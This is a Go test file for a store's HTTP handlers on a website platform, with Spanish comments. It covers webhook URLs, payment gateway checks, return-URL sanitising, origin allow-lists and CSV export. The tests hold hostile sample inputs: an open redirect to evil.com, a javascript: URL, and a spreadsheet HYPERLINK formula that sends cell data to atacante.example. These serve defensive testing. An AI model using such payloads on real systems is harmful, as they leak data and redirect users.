// SPDX-License-Identifier: Apache-2.0
// Copyright (c) 2026 Daniel Delgado Ramos

package pageshttp

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"

	"git.sytue.eu/sytue/one/platform/pkg/keycrypto"
	"git.sytue.eu/sytue/one/services/pages/internal/domain"
	"git.sytue.eu/sytue/one/services/pages/internal/store"
	"git.sytue.eu/sytue/one/services/pages/internal/tienda"
)

func routerTiendaTest(t *testing.T) (*chi.Mux, *Handlers) {
	kek := []byte("01234567890123456789012345678901")
	kc, err := keycrypto.New(kek)
	if err != nil {
		t.Fatalf("keycrypto: %v", err)
	}

	st := store.New(nil)
	tiendaSvc := tienda.Nuevo(st, kc, "https://web.sytue.localhost", "sites.sytue.localhost", nil, nil)

	h := &Handlers{
		Deps: Deps{
			Store:  st,
			Tienda: tiendaSvc,
		},
	}

	r := chi.NewRouter()
	r.Route("/sites/{id}/store", func(sr chi.Router) {
		sr.Get("/settings", h.obtenerAjustesTienda)
		sr.Put("/settings", h.guardarAjustesTienda)
		sr.Post("/enable", h.activarTienda)
		sr.Post("/disable", h.desactivarTienda)

		sr.Get("/products", h.listarProductosTienda)
		sr.Post("/products", h.crearProductoTienda)
		sr.Get("/products/{productId}", h.obtenerProductoTienda)
		sr.Put("/products/{productId}", h.actualizarProductoTienda)
		sr.Delete("/products/{productId}", h.eliminarProductoTienda)

		sr.Get("/gateways", h.listarPasarelasTienda)
		sr.Post("/gateways", h.guardarPasarelaTienda)
		sr.Delete("/gateways/{provider}", h.desactivarPasarelaTienda)
		sr.Get("/gateways/{provider}/webhook-url", h.webhookURLPasarelaTienda)
	})

	return r, h
}

func TestTiendaHTTP_WebhookURL(t *testing.T) {
	r, _ := routerTiendaTest(t)
	siteID := uuid.New()

	req := httptest.NewRequest(http.MethodGet, "/sites/"+siteID.String()+"/store/gateways/stripe/webhook-url", http.NoBody)
	req = conAutenticacion(req, []string{"admin"}, "pro")
	rec := httptest.NewRecorder()
	r.ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("code = %d; want 200", rec.Code)
	}
	var res map[string]string
	if err := json.Unmarshal(rec.Body.Bytes(), &res); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if res["webhook_url"] != "https://web.sytue.localhost/webhooks/stripe" {
		t.Errorf("webhook_url = %q; want https://web.sytue.localhost/webhooks/stripe", res["webhook_url"])
	}
}

func TestTiendaHTTP_ValidacionPasarela(t *testing.T) {
	r, _ := routerTiendaTest(t)
	siteID := uuid.New()

	// 1. Petición con JSON inválido da 400
	reqBad := httptest.NewRequest(http.MethodPost, "/sites/"+siteID.String()+"/store/gateways", bytes.NewReader([]byte("{invalido")))
	reqBad = conAutenticacion(reqBad, []string{"admin"}, "pro")
	recBad := httptest.NewRecorder()
	r.ServeHTTP(recBad, reqBad)
	if recBad.Code != http.StatusBadRequest {
		t.Fatalf("JSON inválido: code = %d; want 400", recBad.Code)
	}

	// 2. Pasarela Mollie con clave test incorrecta da 400
	bodyMollie, _ := json.Marshal(map[string]any{
		"provider": "mollie",
		"mode":     "test",
		"credentials": map[string]string{
			"api_key": "live_12345",
		},
	})
	reqMollie := httptest.NewRequest(http.MethodPost, "/sites/"+siteID.String()+"/store/gateways", bytes.NewReader(bodyMollie))
	reqMollie = conAutenticacion(reqMollie, []string{"admin"}, "pro")
	recMollie := httptest.NewRecorder()
	r.ServeHTTP(recMollie, reqMollie)
	if recMollie.Code != http.StatusBadRequest {
		t.Fatalf("Mollie inválido: code = %d; want 400", recMollie.Code)
	}

	// 3. ID de sitio inválido da 400
	reqSiteBad := httptest.NewRequest(http.MethodGet, "/sites/no-uuid/store/settings", http.NoBody)
	reqSiteBad = conAutenticacion(reqSiteBad, []string{"admin"}, "pro")
	recSiteBad := httptest.NewRecorder()
	r.ServeHTTP(recSiteBad, reqSiteBad)
	if recSiteBad.Code != http.StatusBadRequest {
		t.Fatalf("Site ID inválido: code = %d; want 400", recSiteBad.Code)
	}
}

func TestSanitizarReturnURL(t *testing.T) {
	canon := "tienda.ejemplo.sytue.eu"
	sitio := &domain.SitioCompleto{
		CanonicalHost:    &canon,
		ExportOrigins:    []string{"https://app.ejemplo.com"},
		ExportAppSchemes: []string{"mytienda"},
	}

	// 1. Vacío -> default /<lang>/order/
	if got := sanitizarReturnURL("", "es", sitio, canon); got != "https://tienda.ejemplo.sytue.eu/es/order/" {
		t.Errorf("retorno vacio = %q; want default", got)
	}

	// 2. Origen no permitido (intento de redirección abierta) -> default
	if got := sanitizarReturnURL("https://evil.com/hack", "es", sitio, canon); got != "https://tienda.ejemplo.sytue.eu/es/order/" {
		t.Errorf("evil return url aceptado: %q", got)
	}

	// 3. Origen en export_origins -> permitido
	if got := sanitizarReturnURL("https://app.ejemplo.com/order-success", "es", sitio, canon); got != "https://app.ejemplo.com/order-success" {
		t.Errorf("export origin denegado: %q", got)
	}

	// 4. Esquema propio de app permitido
	if got := sanitizarReturnURL("mytienda://order/123", "es", sitio, canon); got != "mytienda://order/123" {
		t.Errorf("app scheme denegado: %q", got)
	}

	// 5. Esquemas prohibidos (javascript, data, file) -> default
	if got := sanitizarReturnURL("javascript:alert(1)", "es", sitio, canon); got != "https://tienda.ejemplo.sytue.eu/es/order/" {
		t.Errorf("javascript scheme aceptado: %q", got)
	}
}

func TestValidarOrigenPermitido(t *testing.T) {
	canon := "tienda.ejemplo.sytue.eu"
	sitio := &domain.SitioCompleto{
		CanonicalHost: &canon,
		ExportOrigins: []string{"https://web.exportada.com"},
	}

	if !validarOrigenPermitido("https://tienda.ejemplo.sytue.eu", "tienda.ejemplo.sytue.eu", sitio) {
		t.Error("host canonico HTTPS debe ser permitido")
	}

	if !validarOrigenPermitido("https://web.exportada.com", "tienda.ejemplo.sytue.eu", sitio) {
		t.Error("export origin debe ser permitido")
	}

	if !validarOrigenPermitido("http://localhost:3000", "tienda.ejemplo.sytue.eu", sitio) {
		t.Error("localhost debe ser permitido para desarrollo")
	}

	if validarOrigenPermitido("https://otro.com", "tienda.ejemplo.sytue.eu", sitio) {
		t.Error("origen no listado no debe ser permitido")
	}
}

// El correo de un pedido lo escribe quien compra, sin sesión; el CSV lo abre un
// administrador en una hoja de cálculo. Una celda que empiece por = + - @ se
// ejecutaría como fórmula.
func TestFilaDePedidoCSVNeutralizaFormulas(t *testing.T) {
	fila := filaDePedidoCSV(domain.Order{
		Number:        "P-0001",
		Status:        "paid",
		BuyerEmail:    `=HYPERLINK("https://atacante.example/?"&A1,"ver")`,
		Currency:      "EUR",
		TotalCents:    -500,
		ERPInvoiceRef: "@SUM(1+1)",
	})
	if got := fila[4]; got != `'=HYPERLINK("https://atacante.example/?"&A1,"ver")` {
		t.Fatalf("buyer_email sin neutralizar: %q", got)
	}
	if got := fila[7]; got != "'@SUM(1+1)" {
		t.Fatalf("erp_invoice_ref sin neutralizar: %q", got)
	}
	// Lo que no es texto libre no se toca: un importe negativo sigue siendo un número.
	if fila[0] != "P-0001" || fila[6] != "-500" {
		t.Fatalf("columnas que no debían cambiar: %q %q", fila[0], fila[6])
	}
}
